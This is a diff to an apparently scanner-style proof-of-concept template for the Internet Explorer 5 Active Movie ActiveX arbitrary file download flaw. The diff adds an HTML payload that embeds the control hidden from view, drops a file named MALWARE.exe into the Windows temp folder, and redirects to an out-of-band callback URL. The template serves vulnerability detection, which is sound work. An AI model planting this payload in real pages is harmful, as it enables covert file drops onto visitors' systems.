@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "Microsoft Internet Explorer 5 Active Movie ActiveX 控件（CLSID:05589FA1-C356-11CE-BF01-00AA0055595A）对 Filename 参数缺少类型校验，攻击者可在 HTML 中嵌入 OBJECT 标签并指定任意路径文件下载到目标系统 Windows Temp 目录，配合其他漏洞可执行任意代码。"
+description = "验证 Microsoft Internet Explorer 5 中 Active Movie ActiveX 控件（CLSID:05589FA1-C356-11CE-BF01-00AA0055595A）允许下载任意文件类型的漏洞。PoC 通过构造包含该 ActiveX 控件的 HTML 页面，指定 Filename 参数下载可执行文件到目标系统临时目录，检测浏览器是否在不限制文件类型的情况下下载并保存文件。"
 id = "POC-AVE-2000-0330"
-name = "CVE-2000-0400 Microsoft Active Movie ActiveX Arbitrary File Download PoC"
+name = "Microsoft Internet Explorer 5 Active Movie ActiveX Control Arbitrary File Download PoC"
 severity = "high"
 tags = ["ave-2000-0330"]
 vuln_id = [
@@ -15,8 +15,20 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/"
+path = "/{{BaseURL}}/poc.html"
 protocol = "http"
+
+[poc.requests.body]
+content = '''
+<html>
+<body>
+<OBJECT classid="clsid:05589FA1-C356-11CE-BF01-00AA0055595A" height="1" style="DISPLAY: none" width="1">
+<PARAM NAME="Filename" VALUE="C:\WINDOWS\TEMP\MALWARE.exe">
+</OBJECT>
+<script>location.href="http://{{interactsh-url}}";</script>
+</body>
+</html>'''
+type = "raw"
 
 [[poc.requests.matchers]]
 expect = true
